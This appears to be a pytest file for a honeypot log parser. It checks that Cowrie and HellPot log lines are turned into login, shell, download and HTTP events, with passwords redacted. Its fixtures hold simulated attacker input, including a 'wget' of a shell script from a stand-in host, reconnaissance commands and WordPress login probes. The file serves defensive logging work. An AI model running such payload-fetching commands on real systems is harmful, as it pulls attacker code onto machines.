from app.enrichment.command_extract import extract_commands


def test_cowrie_json_command_redacts_password_and_keeps_input():
    raw = """
2026-04-01T12:00:01.123456789Z {"eventid":"cowrie.login.failed","username":"root","password":"hunter2","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:01.000000Z"}
2026-04-01T12:00:02.123456789Z {"eventid":"cowrie.command.input","input":"wget http://example.test/a.sh","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:02.000000Z"}
2026-04-01T12:00:03.123456789Z {"eventid":"cowrie.session.file_download","url":"http://example.test/a.sh","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:03.000000Z"}
""".strip()
    found = extract_commands(raw)
    kinds = [item.kind for item in found]
    assert kinds == ["login", "shell", "download"]
    assert found[0].command == "login failed as root"
    assert "hunter2" not in found[0].command
    assert found[1].command == "wget http://example.test/a.sh"
    assert found[1].src_ip == "203.0.113.10"
    assert found[2].kind == "download"


def test_text_cmd_and_http_request():
    raw = """
2026-04-01T12:00:04Z [HoneyPotSSHTransport,5,198.51.100.8] CMD: uname -a
2026-04-01T12:00:05Z hellpot request from 198.51.100.9 GET /wp-login.php
""".strip()
    found = extract_commands(raw)
    assert found[0].kind == "shell"
    assert found[0].command == "uname -a"
    assert found[0].src_ip == "198.51.100.8"
    assert found[1].kind == "http"
    assert found[1].command == "GET /wp-login.php"
    assert found[1].src_ip == "198.51.100.9"


def test_hellpot_json_and_key_value_requests():
    raw = """
2026-04-01T12:00:06.123456789-04:00 {"level":"info","msg":"request","method":"GET","path":"/wp-login.php?pass=secret","ip":"203.0.113.50"}
2026-04-01T12:00:07Z INFO request method=POST path=/xmlrpc.php ip=203.0.113.51
""".strip()
    found = extract_commands(raw)
    assert found[0].kind == "http"
    assert found[0].command == "GET /wp-login.php?pass=***"
    assert found[0].src_ip == "203.0.113.50"
    assert found[1].command == "POST /xmlrpc.php"
    assert found[1].src_ip == "203.0.113.51"


def test_reingested_tail_has_stable_fingerprint():
    line = '2026-04-01T12:00:02.123456789Z {"eventid":"cowrie.command.input","input":"id","src_ip":"203.0.113.10","session":"abc","timestamp":"2026-04-01T12:00:02.000000Z"}'
    first = extract_commands(line)
    second = extract_commands(line + "\n" + line)
    assert len(first) == 1
    assert len(second) == 1
    assert first[0].fingerprint == second[0].fingerprint
